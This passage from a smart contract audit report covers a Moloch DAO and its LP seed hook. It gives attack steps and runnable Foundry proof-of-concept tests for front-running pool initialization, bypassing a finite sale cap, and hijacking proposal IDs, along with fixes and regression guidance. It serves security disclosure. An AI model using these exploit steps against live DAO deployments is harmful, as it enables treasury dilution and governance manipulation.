##### Verification
Confirm that each loop iteration produces a new proposal ID, reaches `Defeated`, resolves NO, mints loot to Alice, and decreases `address(dao).balance` after ragequit. The final treasury balance below `63 ether` demonstrates repeatability rather than a one-off accounting anomaly.

##### Outcome
The attacker converts repeated proposal defeats into synthetic loot rewards and then burns that loot for real treasury assets. Honest holders are diluted economically: their share of the remaining treasury shrinks every round even though the attacker never needs to pass a governance action.

</details>

---

<details>
<summary><strong>9. LP seed hook allows attacker-controlled first liquidity and launch-price manipulation</strong></summary>

> **Review: Valid novel finding targeting LPSeedSwapHook peripheral. Same root cause cluster as #3 and #5.** This is the first-liquidity variant of the LPSeedSwapHook pre-creation attack. The attacker creates the pool before `seed()` with a chosen reserve ratio, then DAO funds enter at the attacker-set price. The `amount0Min = amount1Min = 0` in `seed()` exacerbates the issue. Not a Moloch.sol core finding. **V2 hardening:** same fixes as #3/#5 — reserve pool ID at configure time, enforce minimum amounts, and check pool existence before seeding.

**Winfunc ID:** `16`

**CVSS Score:** `7.5`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`

**Vulnerability Type:** `CWE-285: Improper Authorization`

**Source Location:** `src/peripheral/LPSeedSwapHook.sol:318:hookFeeOrHook()`

**Sink Location:** `src/peripheral/LPSeedSwapHook.sol:265:seed()`

#### Summary

An attacker can initialize an LPSeed-managed liquidity pool before the DAO seeds it, leading to attacker-controlled launch pricing and unauthorized control over the pool’s first-liquidity state.

#### Root Cause

`LPSeedSwapHook.seed()` only writes `poolDAO[poolId] = dao` during the later seed transaction, after it computes the canonical hook-based pool key (`src/peripheral/LPSeedSwapHook.sol:249-251`). Meanwhile, `beforeAction()` only blocks LP operations for registered-but-unseeded pools and therefore returns success for the exact pre-seed state where `poolDAO[poolId] == address(0)` (`src/peripheral/LPSeedSwapHook.sol:334-350`).

`seed()` also assumes it is the first LP and calls `ZAMM.addLiquidity` with `amount0Min = 0` and `amount1Min = 0` (`src/peripheral/LPSeedSwapHook.sol:257-265`). If an attacker has already initialized the deterministic pool, the DAO silently joins the attacker-created pool at the attacker-chosen reserve ratio instead of reverting.

#### Impact

###### Confirmed Impact
A non-DAO actor can become the first LP for the DAO’s intended hook pool and force the subsequent DAO seed transaction to add liquidity into an already-initialized pool. This breaks the module’s stated exclusive-initialization guarantee and lets the attacker control the pool’s opening price curve.

###### Potential Follow-On Impact
If the attacker or other traders hold additional paired assets, they can trade against the mispriced launch pool or position around the skewed initial reserves to extract economic value from the DAO’s liquidity deployment. In share-paired launches, the manipulated opening price can also distort early governance accumulation and off-chain price discovery, although the exact profit depends on market participation and the chosen ratio.

#### Source-to-Sink Trace

1. **[src/peripheral/LPSeedSwapHook.sol:318](../src/peripheral/LPSeedSwapHook.sol#L318)**

   ```solidity
   function hookFeeOrHook() public view returns (uint256) { return uint256(uint160(address(this))) | FLAG_BEFORE; }
   ```

   The hook-encoded `feeOrHook` value is publicly available, so any attacker can compute the exact pool key used by LPSeed-managed pools.

2. **[src/peripheral/LPSeedSwapHook.sol:334](../src/peripheral/LPSeedSwapHook.sol#L334)**

   ```solidity
   address dao = poolDAO[poolId]; ... if (dao != address(0) && !seeds[dao].seeded) { ... if (!seeding) revert NotReady(); } return 0;
   ```

   On ZAMM LP callbacks, the hook only blocks add/remove liquidity for registered-but-unseeded pools. If `poolDAO[poolId]` is still zero, LP operations are explicitly allowed, enabling unauthorized pre-seed pool initialization.

3. **[src/peripheral/LPSeedSwapHook.sol:222](../src/peripheral/LPSeedSwapHook.sol#L222)**

   ```solidity
   cfg.seeded = true;
   ```

   `seed()` flips the seeded flag before the ZAMM call, so the transient seeding guard does not meaningfully protect the canonical first-seed path.

4. **[src/peripheral/LPSeedSwapHook.sol:250](../src/peripheral/LPSeedSwapHook.sol#L250)**

   ```solidity
   uint256 poolId = uint256(keccak256(abi.encode(key))); poolDAO[poolId] = dao;
   ```

   The DAO-to-pool registration happens only during the later `seed()` transaction, after an attacker could already have initialized the deterministic pool.

5. **[src/peripheral/LPSeedSwapHook.sol:265](../src/peripheral/LPSeedSwapHook.sol#L265)**

   ```solidity
   ZAMM.addLiquidity{value: ethValue}(key, amt0, amt1, 0, 0, dao, block.timestamp);
   ```

   The DAO treasury is finally deployed into ZAMM with zero minimum amounts and no empty-pool check, so an attacker-created pool is accepted and the DAO joins the attacker-selected reserve ratio.

#### Exploit Analysis

##### Attack Narrative
The attacker is an externally owned account or contract that can obtain the two assets needed for the seed pair. For the common ETH/SHARES or ERC20/SHARES case, that can be an initial holder, a public share-sale buyer, or any party that acquires shares before the seed transaction is mined.

After reading the public seed configuration and computing the deterministic hook-based pool key, the attacker calls `ZAMM.addLiquidity` first. Because `beforeAction()` allows LP operations whenever `poolDAO[poolId]` is still unset, the hook does not block this unauthorized first-liquidity addition. Later, when anyone calls the permissionless `seed()` entrypoint, the DAO spends its allowances and adds liquidity into the attacker-created pool at the attacker-selected ratio because `seed()` never checks that the pool is empty and passes zero minimum amounts.

##### Prerequisites
- **Attacker Control/Position:** Control of an EOA or contract that can submit transactions to the public chain and hold both assets in the configured LP pair
- **Required Access/Placement:** Unauthenticated public user
- **User Interaction:** None
- **Privileges/Configuration Required:** The DAO must have configured `LPSeedSwapHook` for a token pair; if one side is shares, the attacker must first acquire some shares (e.g. as an initial holder or via `ShareSale.buy` when a sale is enabled)
- **Knowledge Required:** Public knowledge of the DAO address, configured token pair, and hook address/fee value
- **Attack Complexity:** Low — the pool key is deterministic, `hookFeeOrHook()` is public, and `addLiquidity` is permissionless

##### Attack Steps
1. Observe the DAO’s LP seed configuration in `seeds[dao]` and the public hook encoding from `hookFeeOrHook()`.
2. Compute the canonical `IZAMM.PoolKey` and corresponding `poolId` for the DAO’s intended pool.
3. Acquire the two paired assets and call `ZAMM.addLiquidity` before any call to `lpSeed.seed(dao)`.
4. `LPSeedSwapHook.beforeAction()` receives the callback from ZAMM, finds `poolDAO[poolId] == address(0)`, and returns success instead of reverting.
5. Wait for anyone to call the permissionless `lpSeed.seed(dao)` entrypoint.
6. `seed()` spends the DAO’s token allowances and calls `ZAMM.addLiquidity(..., 0, 0, dao, block.timestamp)`, causing the DAO to join the attacker-created pool at the attacker-controlled reserve ratio.
7. Optionally trade around or withdraw liquidity from the manipulated launch pool, depending on the chosen ratio and market response.

##### Impact Breakdown
- **Confirmed Impact:** Unauthorized first-liquidity control over the DAO’s intended LPSeed pool and forced DAO seeding into attacker-created reserves
- **Potential Follow-On Impact:** Mispricing-driven arbitrage, launch manipulation, and early governance/share accumulation distortions if the attacker or other traders can exploit the attacker-set opening curve
- **Confidentiality:** None — the bug does not expose private data
- **Integrity:** High — the attacker can override the DAO’s intended exclusive initialization and opening price formation
- **Availability:** None — the pool still functions, but with attacker-chosen initial state

#### Recommended Fix

Pre-register the intended pool during configuration and make `beforeAction()` reject all LP operations for that registered pool until a legitimate seed transaction is in progress. Also delay `cfg.seeded = true` until after the initial `addLiquidity` succeeds, so the transient seeding flag actually distinguishes the authorized first seed from any other LP addition.

Before:
```solidity
// configure()
seeds[msg.sender] = SeedConfig({ ... seeded: false });

// seed()
cfg.seeded = true;
uint256 poolId = uint256(keccak256(abi.encode(key)));
poolDAO[poolId] = dao;
(uint256 used0, uint256 used1, uint256 liq) =
    ZAMM.addLiquidity{value: ethValue}(key, amt0, amt1, 0, 0, dao, block.timestamp);
```

After:
```solidity
function configure(
    address tokenA,
    uint128 amountA,
    address tokenB,
    uint128 amountB,
    uint40 deadline,
    address shareSale,
    uint128 minSupply
) public {
    // existing validation...

    seeds[msg.sender] = SeedConfig({
        tokenA: tokenA,
        tokenB: tokenB,
        amountA: amountA,
        amountB: amountB,
        feeBps: 0,
        deadline: deadline,
        shareSale: shareSale,
        minSupply: minSupply,
        seeded: false
    });

    (address t0, address t1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
    IZAMM.PoolKey memory key = IZAMM.PoolKey({
        id0: 0,
        id1: 0,
        token0: t0,
        token1: t1,
        feeOrHook: hookFeeOrHook()
    });
    poolDAO[uint256(keccak256(abi.encode(key)))] = msg.sender;
}

function seed(address dao) public returns (uint256 liquidity) {
    SeedConfig storage cfg = seeds[dao];
    _checkReady(dao, cfg);

    uint256 poolId = /* compute canonical poolId */;
    (,,,,,, uint256 supply) = ZAMM.pools(poolId);
    require(supply == 0, AlreadySeeded());

    assembly ("memory-safe") {
        tstore(SEEDING_SLOT, address())
    }
    (uint256 used0, uint256 used1, uint256 liq) =
        ZAMM.addLiquidity{value: ethValue}(key, amt0, amt1, amt0, amt1, dao, block.timestamp);
    assembly ("memory-safe") {
        tstore(SEEDING_SLOT, 0)
    }

    cfg.seeded = true;
    liquidity = liq;
}

function beforeAction(bytes4 sig, uint256 poolId, address, bytes calldata)
    external
    payable
    override
    returns (uint256 feeBps)
{
    address dao = poolDAO[poolId];

    if (sig != IZAMM.swapExactIn.selector && sig != IZAMM.swapExactOut.selector && sig != IZAMM.swap.selector) {
        if (dao == address(0)) revert NotConfigured();
        if (!seeds[dao].seeded) {
            bool seeding;
            assembly ("memory-safe") { seeding := tload(SEEDING_SLOT) }
            if (!seeding) revert NotReady();
        }
        return 0;
    }
    // existing swap logic...
}
```

##### Security Principle
Authorization decisions must be made against the final resource identity before the first privileged action occurs. If a pool is meant to be exclusively initialized by the DAO, the code must bind that pool ID to the DAO before any external party can interact with it.

##### Defense in Depth
- Add an explicit `ZAMM.pools(poolId)` emptiness check before seeding and revert if the pool already has supply or reserves.
- Use non-zero minimum amounts or an exact-ratio check in `seed()` so unexpected pool state cannot silently change launch pricing.
- Emit the computed `poolId` during configuration and add off-chain monitoring that alerts if supply becomes non-zero before the authorized seed transaction.

##### Verification Guidance
- Add a regression test proving that third-party `ZAMM.addLiquidity` reverts before `seed()` for a configured pool.
- Add a regression test proving that `seed()` succeeds for the first authorized LP addition and that `cfg.seeded` only flips after the ZAMM call completes.
- Add a regression test proving that `seed()` reverts when the target pool already has non-zero supply/reserves.
- Add a regression test proving that post-seed public LP additions and swaps still work as intended.

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:**
  ```bash
  curl -L https://foundry.paradigm.xyz | bash
  foundryup
  forge install
  ```
- **Target Setup:**
  ```bash
  git clone <repo-url>
  cd <repo>
  forge test --match-contract LPSeedSwapHookFrontRunTest --match-test test_FrontRunPoolInitializationControlsLaunchPrice -vvv
  ```

##### Runnable PoC
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "./LPSeedSwapHook.t.sol";
import {IZAMM} from "../src/peripheral/LPSeedSwapHook.sol";

interface IERC20Like {
    function approve(address spender, uint256 amount) external returns (bool);
}

contract LPSeedSwapHookFrontRunTest is LPSeedSwapHookTest {
    IZAMM internal constant ZAMM_SINGLETON =
        IZAMM(0x000000000000040470635EB91b7CE4D132D616eD);

    function test_FrontRunPoolInitializationControlsLaunchPrice() public {
        // DAO intends to seed an ETH/SHARES pool at 10 ETH : 100 SHARES.
        (address dao, address sharesAddr) =
            _deployWithSeed(bytes32(uint256(777)), 10 ether, 100e18, 0, address(0), 0);

        IZAMM.PoolKey memory key = IZAMM.PoolKey({
            id0: 0,
            id1: 0,
            token0: address(0),
            token1: sharesAddr,
            feeOrHook: lpSeed.hookFeeOrHook()
        });
        uint256 poolId = uint256(keccak256(abi.encode(key)));

        // Alice is just an EOA with ETH and the initial 100 shares from the summon.
        vm.startPrank(alice);
        IERC20Like(sharesAddr).approve(address(ZAMM_SINGLETON), type(uint256).max);

        // Unauthorized first LP at a manipulated 1 ETH : 100 SHARES ratio.
        ZAMM_SINGLETON.addLiquidity{value: 1 ether}(
            key,
            1 ether,
            100e18,
            0,
            0,
            alice,
            block.timestamp
        );
        vm.stopPrank();

        (uint112 reserve0Before, uint112 reserve1Before,,,,,) = ZAMM_SINGLETON.pools(poolId);
        assertEq(reserve0Before, 1 ether);
        assertEq(reserve1Before, 100e18);

        // The DAO seed no longer initializes the pool; it joins Alice's pool instead.
        lpSeed.seed(dao);

        (uint112 reserve0After, uint112 reserve1After,,,,,) = ZAMM_SINGLETON.pools(poolId);

        // If LPSeed were exclusive, the pool would have launched at 10 ETH : 100 SHARES.
        // Instead, the attacker-set 1 ETH : 100 SHARES ratio is preserved.
        assertEq(reserve0After, 2 ether);
        assertEq(reserve1After, 200e18);
        assertEq(uint256(reserve1After) * 1 ether / uint256(reserve0After), 100e18);
    }
}
```

##### Steps
1. **Add the PoC test file**
```bash
cat > test/LPSeedSwapHookFrontRun.t.sol <<'EOF'
// paste the Solidity PoC above here
EOF
```
- Expected: the repository now contains a dedicated regression test for front-run initialization.

2. **Run the PoC test**
```bash
forge test --match-contract LPSeedSwapHookFrontRunTest --match-test test_FrontRunPoolInitializationControlsLaunchPrice -vvv
```
- Expected: the test passes, proving an EOA can initialize the pool before `seed()` and that the DAO later joins the attacker-created pool.

##### Verification
Confirm that `ZAMM.pools(poolId)` reports non-zero supply/reserves before `lpSeed.seed(dao)` is called, and that after `seed()` the final reserves still reflect the attacker’s 1 ETH : 100 SHARES ratio rather than the DAO’s intended 10 ETH : 100 SHARES ratio.

##### Outcome
The attacker becomes the unauthorized first LP for the DAO’s intended hook pool and dictates the opening reserve ratio. When the DAO later seeds liquidity, its treasury joins the attacker-initialized pool instead of creating the launch pool on its own terms.

</details>

---

<details>
<summary><strong>10. Exact-cap purchase turns a finite token sale into unlimited over-cap issuance</strong></summary>

> **Review: Duplicate of KF#1 (sale cap sentinel collision). Severity adjusted to Low.** SECURITY.md KF#1: "Sale cap sentinel collision (`0` = unlimited = exhausted)." The most widely confirmed finding across all audits — Zellic, Pashov, SCV Scan, QuillShield, Grimoire, Archethect V2, Almanax, Ackee, and others. Buyer still pays `pricePerShare` — no free tokens. For non-minting sales, the DAO's held share balance is the real hard cap. V2 hardening candidate: use `type(uint256).max` as the "unlimited" sentinel. **Severity: Low (per KF#1).**

**Winfunc ID:** `18`

**CVSS Score:** `7.5`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`

**Vulnerability Type:** `CWE-682: Incorrect Calculation`

**Source Location:** `src/Moloch.sol:706:buyShares()`

**Sink Location:** `src/Moloch.sol:726:buyShares()`

#### Summary

An attacker can exhaust a finite DAO token-sale cap with an exact-cap purchase in Moloch sales, leading to unauthorized over-cap share or loot issuance.

#### Root Cause

`setSale()` and the `Sale` struct encode `cap == 0` as "unlimited" (`src/Moloch.sol:108-115`, `691-703`), but `buyShares()` also writes `s.cap = cap - shareAmount` for finite sales (`src/Moloch.sol:723-727`). When `shareAmount == cap`, the function stores `0` without deactivating the sale, and later calls treat that exhausted finite sale as an unlimited one because cap checks only run when `cap != 0` (`src/Moloch.sol:715-716`).

#### Impact

###### Confirmed Impact
A buyer can purchase beyond a DAO’s configured finite sale limit once they first buy exactly the remaining cap. In minting sales, this causes fresh shares or loot to be issued past the intended maximum; in non-minting sales, it can sell past the intended allotment up to the DAO’s inventory.

###### Potential Follow-On Impact
If the affected sale mints voting shares at an economically favorable price, the attacker can potentially accumulate enough governance power for proposal capture or severe dilution. If the sale issues loot or the DAO is ragequittable, over-cap purchases may also enable treasury extraction or materially worse exit terms for existing holders, subject to deployment configuration and pricing.

#### Source-to-Sink Trace

1. **[src/Moloch.sol:700](../src/Moloch.sol#L700)**

   ```solidity
   sales[payToken] = Sale({ pricePerShare: pricePerShare, cap: cap, minting: minting, active: active, isLoot: isLoot });
   ```

   Governance configures a sale with a finite `cap`. The struct definition documents `0` as the special unlimited value, establishing the ambiguous state encoding that the exploit abuses later.

2. **[src/Moloch.sol:706](../src/Moloch.sol#L706)**

   ```solidity
   function buyShares(address payToken, uint256 shareAmount, uint256 maxPay)
   ```

   The attacker controls `shareAmount` through the public `buyShares()` entry point and can deliberately choose a value equal to the current remaining cap.

3. **[src/Moloch.sol:716](../src/Moloch.sol#L716)**

   ```solidity
   if (cap != 0 && shareAmount > cap) revert NotOk();
   ```

   The only cap guard rejects purchases strictly greater than the remaining cap. An exact-cap purchase (`shareAmount == cap`) is allowed.

4. **[src/Moloch.sol:726](../src/Moloch.sol#L726)**

   ```solidity
   s.cap = cap - shareAmount;
   ```

   For that exact-cap purchase, the function writes `0` into storage. Because `0` is also the sentinel for intentionally unlimited sales, the finite sale is now misclassified.

5. **[src/Moloch.sol:1013](../src/Moloch.sol#L1013)**

   ```solidity
   tstore(REENTRANCY_GUARD_SLOT, 0)
   ```

   The non-reentrancy guard is cleared when the first call returns, so the attacker can immediately make a second sequential `buyShares()` call in the same transaction or bundle.

6. **[src/Moloch.sol:715](../src/Moloch.sol#L715)**

   ```solidity
   uint256 cap = s.cap;
   ```

   On the attacker’s next purchase, `buyShares()` reloads the now-zero cap from storage. Because zero is treated as the unlimited sentinel, the finite-cap check is skipped entirely.

7. **[src/Moloch.sol:748](../src/Moloch.sol#L748)**

   ```solidity
   shares.mintFromMoloch(msg.sender, shareAmount);
   ```

   In the minting-sale path, the second call mints fresh shares to the attacker even though the DAO’s finite cap was already exhausted. The adjacent loot mint path at line 747 is affected equivalently.

#### Exploit Analysis

##### Attack Narrative
The attacker is a normal public buyer watching an active sale configured through `Moloch.setSale()`. They query the current remaining cap on-chain, then deliberately submit a purchase whose `shareAmount` equals that exact remaining cap. Because `buyShares()` only rejects `shareAmount > cap`, the purchase succeeds and writes `s.cap = 0` while leaving the sale active.

The same attacker can then immediately submit another purchase, even in the same transaction through a helper contract or bundle. On the second call, `buyShares()` interprets `cap == 0` as the special unlimited state, skips cap enforcement entirely, and proceeds to mint or transfer additional shares/loot beyond the finite sale limit that governance intended.

##### Prerequisites
- **Attacker Control/Position:** Controls a buyer account or contract that can call `buyShares()` and pay the configured sale price
- **Required Access/Placement:** Unauthenticated public user
- **User Interaction:** None
- **Privileges/Configuration Required:** A sale must be active with a finite non-zero cap; the highest-impact path is a minting sale, though non-minting sales are also affected when DAO inventory exceeds the intended allotment
- **Knowledge Required:** Sale pay token, current remaining cap, and price (all observable on-chain)
- **Attack Complexity:** Low — the attacker only needs to buy the exact remaining cap once, then buy again; this can be bundled into a single transaction because no control deactivates the sale when the finite cap reaches zero

##### Attack Steps
1. Query `sales(payToken)` and identify an active sale with `cap > 0`
2. Call `buyShares(payToken, cap, maxPay)` so that `shareAmount == currentCap`
3. Let `buyShares()` store `s.cap = 0` and return without setting `s.active = false`
4. Immediately call `buyShares(payToken, extraAmount, maxPay)` again
5. Repeat step 4 for as long as the attacker wants to mint or purchase over-cap inventory

##### Impact Breakdown
- **Confirmed Impact:** Finite sale caps can be bypassed, allowing more shares or loot to be sold than governance configured
- **Potential Follow-On Impact:** Depending on pricing and DAO settings, the extra issuance can cause severe dilution, governance capture with voting shares, or treasury extraction through ragequit-capable loot/share accumulation
- **Confidentiality:** None — the flaw does not directly expose private data
- **Integrity:** High — the protocol’s core sale-allocation invariant is broken, enabling unauthorized over-cap issuance/sale of governance assets
- **Availability:** None — the bug does not directly prevent protocol use, though governance and economic outcomes can be destabilized

#### Recommended Fix

Introduce a distinct representation for "unlimited" so that a finite sale reaching zero cannot be reinterpreted as unlimited. The safest approach is to track unlimited sales separately and deactivate a finite sale when its remaining cap reaches zero.

Before:
```solidity
struct Sale {
    uint256 pricePerShare; // in payToken units (wei for ETH)
    uint256 cap; // remaining shares (0 = unlimited)
    bool minting; // true=mint, false=transfer Moloch-held
    bool active;
    bool isLoot;
}

uint256 cap = s.cap;
if (cap != 0 && shareAmount > cap) revert NotOk();

if (cap != 0) {
    unchecked {
        s.cap = cap - shareAmount;
    }
}
```

After:
```solidity
struct Sale {
    uint256 pricePerShare;
    uint256 cap;        // remaining shares for finite sales
    bool unlimited;     // true only for intentionally unlimited sales
    bool minting;
    bool active;
    bool isLoot;
}

uint256 cap = s.cap;
if (!s.unlimited) {
    if (shareAmount > cap) revert NotOk();

    uint256 newCap = cap - shareAmount;
    s.cap = newCap;
    if (newCap == 0) {
        s.active = false;
    }
}
```

Update `setSale()` so `unlimited` is initialized from the governance input (`cap == 0`) instead of overloading `cap` itself. If preserving the current external ABI is important, an equivalent internal-only fix is to use a distinct internal sentinel (for example `type(uint256).max`) and never let finite sales transition into that sentinel value.

##### Security Principle
Security-critical state should never overload the same value to mean both a benign configuration (`unlimited`) and a terminal runtime state (`sold out`). Separating those states eliminates ambiguous control flow and preserves the cap invariant across all boundary conditions.

##### Defense in Depth
- Emit a dedicated `SaleSoldOut` event and automatically deactivate finite sales when the remaining cap reaches zero
- Add invariant/property tests that assert finite sales can never mint or transfer more than the configured total, including exact-cap and same-transaction multi-buy cases

##### Verification Guidance
- Add a regression test where `shareAmount == currentCap` and assert the next purchase reverts for a finite sale
- Add a same-transaction test that performs two sequential `buyShares()` calls and proves the second one cannot bypass the exhausted finite cap
- Verify that intentionally unlimited sales (`cap == 0` at configuration time) still function as expected

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:**
```bash
curl -L https://foundry.paradigm.xyz | bash
source ~/.bashrc
foundryup
git submodule update --init --recursive
```
- **Target Setup:** from the repository root
```bash
forge build
```

##### Runnable PoC
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {Moloch, Call, Shares} from "src/Moloch.sol";

contract SaleCapBypassPoC is Test {
    function test_ExactCapPurchaseTurnsFiniteSaleIntoUnlimitedSale() public {
        Moloch dao = new Moloch();
        vm.deal(address(this), 100);

        address[] memory holders = new address[](1);
        holders[0] = address(this);

        uint256[] memory initShares = new uint256[](1);
        initShares[0] = 100;

        Call[] memory initCalls = new Call[](1);
        initCalls[0] = Call({
            target: address(dao),
            value: 0,
            data: abi.encodeWithSelector(
                Moloch.setSale.selector,
                address(0), // ETH sale
                1,          // 1 wei per share unit
                10,         // finite cap of 10 units
                true,       // minting sale
                true,       // active
                false       // shares, not loot
            )
        });

        dao.init("Org", "ORG", "", 0, false, address(0), holders, initShares, initCalls);

        // First purchase consumes the entire configured cap.
        dao.buyShares{value: 10}(address(0), 10, 0);

        (uint256 price, uint256 capAfterFirstBuy, bool minting, bool active, bool isLoot) =
            dao.sales(address(0));
        assertEq(price, 1);
        assertEq(capAfterFirstBuy, 0, "sold-out sale is encoded as unlimited");
        assertTrue(minting);
        assertTrue(active, "sale stays active after cap reaches zero");
        assertFalse(isLoot);

        // This should fail for a finite 10-unit sale, but it succeeds.
        dao.buyShares{value: 1}(address(0), 1, 0);

        Shares shares = dao.shares();
        assertEq(shares.balanceOf(address(this)), 111, "buyer minted beyond the configured cap");
    }
}
```

##### Steps
1. **Create the PoC test file**
```bash
cat > test/PoC_SaleCapBypass.t.sol <<'EOF'
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {Moloch, Call, Shares} from "src/Moloch.sol";

contract SaleCapBypassPoC is Test {
    function test_ExactCapPurchaseTurnsFiniteSaleIntoUnlimitedSale() public {
        Moloch dao = new Moloch();
        vm.deal(address(this), 100);

        address[] memory holders = new address[](1);
        holders[0] = address(this);

        uint256[] memory initShares = new uint256[](1);
        initShares[0] = 100;

        Call[] memory initCalls = new Call[](1);
        initCalls[0] = Call({
            target: address(dao),
            value: 0,
            data: abi.encodeWithSelector(
                Moloch.setSale.selector,
                address(0),
                1,
                10,
                true,
                true,
                false
            )
        });

        dao.init("Org", "ORG", "", 0, false, address(0), holders, initShares, initCalls);
        dao.buyShares{value: 10}(address(0), 10, 0);
        dao.buyShares{value: 1}(address(0), 1, 0);

        Shares shares = dao.shares();
        assertEq(shares.balanceOf(address(this)), 111);
    }
}
EOF
```
- Expected: the file is written successfully
2. **Run the targeted test**
```bash
forge test --match-test test_ExactCapPurchaseTurnsFiniteSaleIntoUnlimitedSale -vv
```
- Expected: the test passes, meaning the second over-cap purchase succeeded instead of reverting

##### Verification
Check that the test completes successfully and that the final buyer balance is `111`, even though the sale was configured with a finite cap of `10`. If you log `dao.sales(address(0))` after the first purchase, `cap` will be `0` while `active` remains `true`.

##### Outcome
The attacker acquires more shares than the DAO configured the sale to allow. In a real deployment, the attacker can keep buying beyond the intended cap until governance intervenes, or bundle multiple purchases in one transaction to complete the bypass immediately.

</details>

---

<details>
<summary><strong>11. Raw DAO launch lets a frontrunner seize proposer control and block cancellation for that proposal ID</strong></summary>

> **Review: Variant of KF#11 (proposalThreshold == 0 griefing). Severity adjusted to Low.** This is the proposal-ID tombstoning / front-run cancel class previously found by Octane (#1), Zellic (#10), DeepSeek, Almanax (LOW-1), Solarizer (MED-1), and Grimoire. Key mitigations: (1) `castVote` auto-opens proposals atomically (proposers use `multicall` to open+vote in one tx), (2) `proposalThreshold > 0` restricts who can open, (3) auto-futarchy blocks cancellation via nonzero `F.pool`, (4) proposer can reissue with a new nonce. The "raw DAO launch" framing is specific to zero-threshold DAOs deployed through raw `Summoner.summon()` — SafeSummoner enforces `proposalThreshold > 0`. **Severity: Low (per KF#11, configuration-dependent).**

**Winfunc ID:** `26`

**CVSS Score:** `7.1`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:L`

**Vulnerability Type:** `CWE-285: Improper Authorization`

**Source Location:** `src/Moloch.sol:530:fundFutarchy()`

**Sink Location:** `src/Moloch.sol:428:cancelProposal()`

#### Summary

An unauthenticated on-chain attacker can front-run proposal opening in a raw-launched DAO, leading to proposer hijacking and loss of cancellation control for that specific proposal ID.

#### Root Cause

`Moloch.init` does not initialize `proposalThreshold` or `proposalTTL`; unless deployment-time `initCalls` explicitly self-call the DAO setters, both remain at their zero defaults. `openProposal` treats a zero `proposalThreshold` as “no authorization required” and records `proposerOf[id] = msg.sender`, while `fundFutarchy` auto-opens unopened proposals and adds a non-zero futarchy pool that `cancelProposal` later forbids.

#### Impact

###### Confirmed Impact
Any attacker who learns a pending proposal ID can front-run with `fundFutarchy(id, address(0), 1)` and 1 wei, become the recorded proposer, and make that exact proposal ID impossible to cancel through `cancelProposal`. The original proposer loses lifecycle control over the affected proposal even though they created the underlying governance action.

###### Potential Follow-On Impact
If proposal contents are disclosed before the intended opening transaction, the attacker can also lock the snapshot earlier than the proposer intended. On raw launches that also leave `proposalTTL` at zero, attacker-opened proposals can remain active indefinitely until quorum or execution conditions change, forcing proposers to abandon the affected ID and reissue the action under a new nonce or config.

#### Source-to-Sink Trace

1. **[src/Moloch.sol:35](../src/Moloch.sol#L35)**

   ```solidity
   uint96 public proposalThreshold; // minimum votes to make proposal
   ```

   The governance authorization threshold defaults to zero at deployment unless later changed.

2. **[src/Moloch.sol:243](../src/Moloch.sol#L243)**

   ```solidity
   for (uint256 i; i != initCalls.length; ++i) { (bool ok,) = initCalls[i].target.call{value: initCalls[i].value}(initCalls[i].data); require(ok, NotOk()); }
   ```

   `Moloch.init` only applies optional caller-supplied self-calls; when raw summon passes an empty `initCalls` array, `proposalThreshold` and `proposalTTL` remain unset.

3. **[src/Moloch.sol:541](../src/Moloch.sol#L541)**

   ```solidity
   if (snapshotBlock[id] == 0) openProposal(id);
   ```

   The public `fundFutarchy` entrypoint auto-opens any unopened proposal ID supplied by the attacker.

4. **[src/Moloch.sol:283](../src/Moloch.sol#L283)**

   ```solidity
   uint96 threshold = proposalThreshold; if (threshold != 0) { require(_shares.getVotes(msg.sender) >= threshold, Unauthorized()); }
   ```

   Because the threshold is still zero, `openProposal` performs no proposer authorization check for the attacker.

5. **[src/Moloch.sol:299](../src/Moloch.sol#L299)**

   ```solidity
   proposalIds.push(id); proposerOf[id] = msg.sender;
   ```

   The first attacker-controlled opener becomes the recorded proposer for that content-addressed proposal ID.

6. **[src/Moloch.sol:569](../src/Moloch.sol#L569)**

   ```solidity
   F.pool += amount;
   ```

   The attacker only needs a non-zero amount (for example 1 wei ETH) to seed the futarchy pool.

7. **[src/Moloch.sol:428](../src/Moloch.sol#L428)**

   ```solidity
   if (F.enabled && F.pool != 0) revert NotOk();
   ```

   Once the pool is non-zero, `cancelProposal` becomes unavailable, making the attacker-opened proposal non-cancelable on-chain.

#### Exploit Analysis

##### Attack Narrative
The attacker watches a freshly deployed DAO that was launched through the raw `Summoner.summon` path without governance initialization self-calls. Because `proposalThreshold` stays at zero, the first caller to touch a proposal ID is treated as authorized to open it, even though the DAO intended proposal creation to be gated by share ownership or deployment-time configuration.

When the attacker learns a pending proposal ID—most directly from a victim’s mempool transaction or any other public disclosure of the proposal calldata—they front-run with `fundFutarchy(id, address(0), 1)` and 1 wei. That single transaction auto-opens the proposal, assigns `proposerOf[id]` to the attacker, and seeds a non-zero futarchy pool. From that point forward, the original proposer cannot cancel because they are no longer `proposerOf[id]`, and the attacker cannot cancel either because `cancelProposal` rejects all proposals with funded futarchy pools.

##### Prerequisites
- **Attacker Control/Position:** The attacker can submit public EVM transactions and observe pending transactions or otherwise learn the target proposal ID
- **Required Access/Placement:** Unauthenticated external user
- **User Interaction:** Required — a legitimate proposer must submit or publicly disclose the targeted proposal/action
- **Privileges/Configuration Required:** The DAO must be launched through raw `Summoner.summon` / `Moloch.init` without an init self-call that sets a non-zero `proposalThreshold` (and raw launches commonly also leave `proposalTTL` unset)
- **Knowledge Required:** The attacker needs the proposal ID, or enough calldata/nonce detail to derive it
- **Attack Complexity:** Low — once the proposal ID is known, the exploit is a single public transaction with 1 wei of ETH

##### Attack Steps
1. Identify a DAO deployed via the raw summon path where `proposalThreshold()` returns `0`
2. Observe a pending proposal-opening, proposal-funding, or equivalent transaction that reveals the targeted proposal ID
3. Send `fundFutarchy(id, address(0), 1)` with `msg.value = 1` before the intended proposer’s transaction finalizes
4. Let `fundFutarchy` auto-call `openProposal(id)` and record the attacker as `proposerOf[id]`
5. Rely on the now non-zero futarchy pool to make `cancelProposal(id)` revert for any caller

##### Impact Breakdown
